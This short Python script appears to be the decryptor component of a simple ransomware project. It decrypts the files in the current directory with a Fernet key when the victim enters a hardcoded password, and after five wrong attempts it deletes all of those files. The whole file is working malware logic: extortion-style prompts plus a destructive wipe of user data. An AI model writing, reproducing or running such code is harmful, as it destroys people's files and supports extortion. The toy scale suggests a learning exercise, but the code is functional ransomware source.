#!/usr/bin/env python

import os
from cryptography.fernet import Fernet

count = 0
files = []
for file in os.listdir():
    if file == "malware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()
    passphrase = "abc"
    
    while count < 5:
        upassword = input("input the password to decrypt your files! ")
        if passphrase == upassword:
            for file in files:
                with open(file, "rb") as thefile:
                    content = thefile.read()
                content_decrypt = Fernet(secretkey).decrypt(content)
                with open(file, "wb") as thefile:
                    thefile.write(content_decrypt)

            print("All your files are ok! tkx")
            break
        else:
            count += 1
            print(":(")

if count == 5:
    for a in files:
        os.remove(a)
